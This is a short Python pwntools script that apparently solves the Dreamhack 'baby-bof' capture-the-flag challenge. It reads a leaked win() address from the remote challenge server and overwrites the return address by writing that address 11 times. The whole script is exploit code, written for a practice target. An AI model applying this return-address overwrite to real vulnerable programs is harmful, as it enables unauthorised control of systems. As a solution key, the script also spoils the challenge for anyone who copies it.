from pwn import *

# Set up the process
#p = process('./baby-bof')
p = remote('host3.dreamhack.games', 8900)

# Get the win() address
p.recvuntil(b'win function (0x')
win_addr = int(p.recvuntil(b')')[:-1], 16)
print(f"Win address: {hex(win_addr)}")

# Send name
p.sendlineafter(b'name: ', b'AAAA')

# Analyze the memory dump (optional, for verification)
p.recvuntil(b'|  addr\t\t|  value\t\t|\n')
for _ in range(0x10):
    print(p.recvline().decode().strip())

# Send win address as hex value
p.sendlineafter(b'hex value: ', hex(win_addr).encode()[2:])

# Send count (11 to reach the return address)
p.sendlineafter(b'integer count: ', b'11')

# Print the result
print(p.recvall().decode())